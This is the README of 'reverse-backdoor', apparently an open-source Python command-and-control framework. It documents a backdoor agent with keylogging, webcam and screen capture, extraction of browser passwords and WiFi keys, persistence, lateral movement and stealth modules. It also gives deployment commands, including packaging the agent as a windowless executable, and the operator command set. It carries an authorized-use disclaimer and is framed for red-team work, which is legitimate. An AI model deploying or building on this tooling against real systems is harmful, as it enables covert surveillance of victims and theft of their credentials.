<h1 align="center">reverse-backdoor</h1>

<p align="center">
  <img src="https://img.shields.io/badge/python-3.9+-blue?style=flat-square&logo=python&logoColor=white" alt="python">
  <img src="https://img.shields.io/badge/platform-Windows%20%7C%20Linux-black?style=flat-square" alt="platforms">
  <img src="https://img.shields.io/badge/arch-modular-purple?style=flat-square" alt="arch">
  <img src="https://img.shields.io/badge/license-MIT-green?style=flat-square" alt="license">
  <a href="https://github.com/erkanrzgc/reverse-backdoor/stargazers"><img src="https://img.shields.io/github/stars/erkanrzgc/reverse-backdoor?style=flat-square&color=yellow" alt="stars"></a>
  <a href="https://github.com/erkanrzgc/reverse-backdoor/issues"><img src="https://img.shields.io/github/issues/erkanrzgc/reverse-backdoor?style=flat-square" alt="issues"></a>
  <a href="https://github.com/erkanrzgc/reverse-backdoor"><img src="https://img.shields.io/github/last-commit/erkanrzgc/reverse-backdoor?style=flat-square" alt="last commit"></a>
</p>

<p align="center">
  <b>reverse-backdoor</b> is a modular, cross-platform C2 framework designed for red team operations, penetration testing, and security research. Features include a keylogger, screenshot/webcam capture, browser credential extraction, WiFi dump, system reconnaissance, and persistence — all controlled through an interactive terminal shell over a JSON-based TCP protocol.
</p>

---

## Features

- **Modular architecture** — clean client/server split with Command Pattern, no god files
- **Cross-platform agent** — full Windows and Linux support via strategy-based platform abstraction
- **ECDH + AES-256-GCM encryption** — optional encrypted JSON wire protocol with perfect forward secrecy
- **Multi-agent C2** — concurrent agent support with interact/background/broadcast commands
- **Interactive C2 shell** — colored terminal interface with session management
- **File manager** — upload, download, list, move, delete, touch, read files; directory zip on download
- **System reconnaissance** — OS version, CPU, RAM, local IP, current user, admin privilege check
- **Keylogger** — `pynput`-based, window-aware, writes to hidden temp file, cross-platform
- **Screenshot & webcam** — capture screen or webcam and exfiltrate as PNG
- **Credential harvesting** — dump saved Chrome/Edge passwords via AES-GCM + DPAPI; WiFi profile extraction
- **Clipboard grab** — PowerShell on Windows, `pyperclip` fallback
- **Persistence** — registry `Run` key, `crontab @reboot`, WMI events, scheduled tasks, systemd
- **Optional encryption** — ECDH key exchange + AES-256-GCM for all messages
- **Dockerized C2 server** — one-command deployment with `docker compose up`
- **CLI-first** — `click`-based command structure with rich output
- **Extended modules** — SOCKS5 proxy, privilege escalation, lateral movement, data exfiltration, stealth

---

## Architecture

```
reverse-backdoor/
├── cli.py                           # CLI entry point (click-based)
├── client/                          # Target agent (backdoor)
│   ├── client.py                    # Entry point
│   ├── config.json                  # Server IP, port, reconnect interval
│   ├── .env.example                 # Environment variable template
│   ├── commands/                    # Command Pattern — one class per command
│   │   ├── base.py                  # Command ABC + SessionContext
│   │   ├── file_commands.py         # ls, cd, pwd, rm, mv, cat, touch
│   │   ├── transfer_commands.py     # upload, download
│   │   ├── shell_commands.py        # ps, kill, pkill, grep, ifconfig
│   │   ├── system_commands.py       # sysinfo, check_admin, clipboard
│   │   ├── surveillance_commands.py # screenshot, webcam
│   │   ├── keylogger_commands.py    # keylog_start, dump, stop
│   │   ├── credential_commands.py   # wifi_dump, browser_creds
│   │   ├── persistence_commands.py  # persistence
│   │   └── session_commands.py      # quit, background, terminate, sendall
│   ├── core/
│   │   ├── protocol.py              # Protocol class (JSON wire, no globals)
│   │   ├── encrypted_protocol.py    # ECDH + AES-256-GCM wrapper
│   │   ├── config.py                # .env + config.json loader
│   │   ├── connection.py            # Socket connect + retry + key exchange
│   │   ├── dispatcher.py            # Thin dispatch loop (~30 lines)
│   │   ├── command_registry.py      # CommandRegistry for str→handler mapping
│   │   └── session_context.py       # SessionContext dataclass
│   ├── modules/
│   │   ├── credentials/             # Split package (was 1 file)
│   │   │   ├── base.py              # CredentialCollector ABC
│   │   │   ├── wifi.py              # WiFi profile extraction
│   │   │   └── browser.py           # Chrome/Edge password decryption
│   │   ├── surveillance/            # Split package (was 1 file)
│   │   │   ├── base.py              # CaptureProvider ABC
│   │   │   ├── screenshot.py        # Screen capture
│   │   │   ├── webcam.py            # Webcam capture
│   │   │   └── clipboard.py         # Clipboard reader
│   │   ├── file_ops.py              # File system operations
│   │   ├── shell.py                 # subprocess wrapper
│   │   ├── sysinfo.py               # System information
│   │   ├── keylogger.py             # Window-aware keylogger
│   │   ├── persistence.py           # Base persistence
│   │   ├── process_ops.py           # Process management
│   │   ├── pivot/                   # SOCKS5 proxy module
│   │   ├── privesc/                 # Privilege escalation (Linux/Windows)
│   │   ├── lateral/                 # Lateral movement module
│   │   ├── exfil/                   # Data exfiltration framework
│   │   ├── persist/                 # Extended persistence methods
│   │   ├── stealth/                 # Anti-VM / obfuscation
│   │   └── rat/                     # Remote control (mouse/keyboard)
│   ├── platform/                    # OS abstraction layer
│   │   ├── base.py                  # AbstractPlatform interface
│   │   ├── linux.py                 # Linux commands
│   │   └── windows.py               # Windows commands
│   └── utils/
│       └── crypto.py                # ECDH + AES-GCM helpers
│
├── server/                          # C2 control server
│   ├── server.py                    # Entry point (signals + master loop)
│   ├── tui.py                       # Textual TUI interface
│   ├── config.json                  # Bind host, port, loot directory
│   ├── .env.example                 # Environment variable template
│   ├── commands/                    # Server-side Command Pattern
│   │   ├── base.py                  # ServerCommand ABC + ServerSessionContext
│   │   ├── system_commands.py       # help, clear, quit
│   │   └── transfer_commands.py     # upload, download, screenshot, webcam
│   ├── core/
│   │   ├── protocol.py              # Protocol class (JSON wire)
│   │   ├── encrypted_protocol.py    # ECDH + AES-256-GCM wrapper
│   │   ├── config.py                # Server-side config loader
│   │   ├── listener.py              # Threaded TCP listener
│   │   ├── session.py               # Per-agent shell + master prompt
│   │   ├── command_router.py        # ServerCommandRouter
│   │   └── agent_registry.py        # Thread-safe agent tracking
│   ├── handlers/
│   │   ├── file_transfer.py         # Upload/download file handlers
│   │   └── local_commands.py        # help, clear display
│   └── ui/
│       ├── prompt.py                # ANSI color helper
│       └── assets/trojan.png        # Logo
├── Dockerfile                       # Server container build
├── docker-compose.yml               # One-command C2 deployment
├── requirements.txt                 # Python dependencies
├── LICENSE                          # MIT License
└── SECURITY.md                      # Security policy
```

---

## Installation

Requires Python **3.9+**.

```bash
git clone https://github.com/erkanrzgc/reverse-backdoor.git
cd reverse-backdoor
python3 -m pip install -r requirements.txt
```

### Quick Start

```bash
# Start C2 server
python3 cli.py server --host 0.0.0.0 --port 5555

# Start agent
python3 cli.py client --host 127.0.0.1 --port 5555

# Generate agent config
python3 cli.py generate --os windows --host 10.0.0.1 --encryption

# Docker deployment
docker compose up -d
```

### Agent (target machine)

```bash
pip install pynput Pillow pyautogui pyscreeze pyperclip
python3 client/client.py
```

Compile to standalone executable:

```bash
pip install pyinstaller
pyinstaller --onefile --noconsole client/client.py
```

---

## Configuration

Sensitive values are loaded from `.env` files (never committed). Template files are provided.

```bash
cp client/.env.example client/.env
cp server/.env.example server/.env
```

### `client/.env`

| Variable | Default | Description |
| --- | --- | --- |
| `REVERSE_BACKDOOR_SERVER_HOST` | `127.0.0.1` | C2 server IP address |
| `REVERSE_BACKDOOR_SERVER_PORT` | `5555` | C2 server port |
| `REVERSE_BACKDOOR_RECONNECT_INTERVAL` | `5` | Seconds between reconnect attempts |
| `REVERSE_BACKDOOR_ENCRYPTION` | `false` | Enable ECDH+AES-256-GCM encryption |

### `server/.env`

| Variable | Default | Description |
| --- | --- | --- |
| `REVERSE_BACKDOOR_BIND_HOST` | `0.0.0.0` | Address to listen on |
| `REVERSE_BACKDOOR_BIND_PORT` | `5555` | Port to listen on |
| `REVERSE_BACKDOOR_LOOT_DIR` | `./loot` | Directory for screenshots, downloads |
| `REVERSE_BACKDOOR_ENCRYPTION` | `false` | Enable ECDH+AES-256-GCM encryption |

---

## Usage

### Master Manager

```
REVERSE_BACKDOOR> agents
  agent-1  192.168.1.100
  agent-2  10.0.0.5

REVERSE_BACKDOOR> interact agent-1
[+] Interacting with agent-1 (192.168.1.100)

* agent-1~192.168.1.100: sysinfo
Operating System: Windows 10 Pro ...

* agent-1~192.168.1.100: background
[+] agent-1 backgrounded

REVERSE_BACKDOOR> broadcast sysinfo
[+] Broadcast sent: sysinfo
```

### File Manager

```
ls                          List directory contents
cd <path>                   Change working directory
pwd                         Print working directory
rm <file>                   Delete a file
rm -r <dir>                 Recursively delete a directory
mv <src> <dst>              Move or rename
upload <local_file>         Upload from server to target
download <remote_path>      Download from target to server
```

### Surveillance

```
screenshot                  Capture and download screenshot
webcam                      Capture and download webcam photo
clipboard                   Dump clipboard contents
keylog_start                Start the keylogger
keylog_dump                 Retrieve captured keystrokes
keylog_stop                 Stop keylogger and delete log
```

### Reconnaissance

```
sysinfo                     Detailed system information
check_admin                 Check admin/root privileges
ip addr                     Network interface configuration
ps                          Process list
wifi_dump                   Extract saved WiFi passwords
browser_creds               Extract Chrome/Edge saved credentials
```

### Persistence

```
persistence <RegName> <FileName>   Install persistence
```

### Session Control

```
quit                        Terminate session
background                  Background current session
clear                       Clear server terminal
```

---

## Docker

```bash
docker compose up -d        # Start C2 server in background
docker compose logs -f      # Follow logs
docker compose down         # Stop and remove
```

The `docker-compose.yml` mounts `./loot` into the container for persistent data.

---

## Protocol

Line-delimited JSON over TCP:

```
→ {"command": "sysinfo"}
← {"response": "Operating System: Windows 10 ..."}
```

Files are transferred as base64-encoded strings within JSON payloads. The wire protocol handles partial reads with a persistent receive buffer, and sends are protected by a threading lock for concurrent access.

---

## Platform Support

| Feature | Windows | Linux |
| --- | :---: | :---: |
| Shell | `dir` / `tasklist` / `ipconfig` | `ls` / `ps` / `ifconfig` |
| Screenshot | pyautogui | pyautogui |
| Webcam | OpenCV | OpenCV |
| Keylogger | pynput + ctypes | pynput |
| Browser creds | Chrome / Edge (DPAPI) | — |
| WiFi dump | `netsh wlan` | — |
| Persistence | Registry Run | crontab @reboot |
| Clipboard | PowerShell | pyperclip |

---

## Legal & Ethical Use

This tool is intended exclusively for:

- Authorized penetration testing and red-team engagements
- Security research in isolated lab environments
- CTF competitions and educational exercises
- Use on systems you own or have explicit written authorization to test

**Do not** deploy on any system without proper authorization. The authors accept no responsibility for misuse.

---

## License

MIT — see [LICENSE](LICENSE).

See [SECURITY.md](SECURITY.md) for vulnerability reporting.
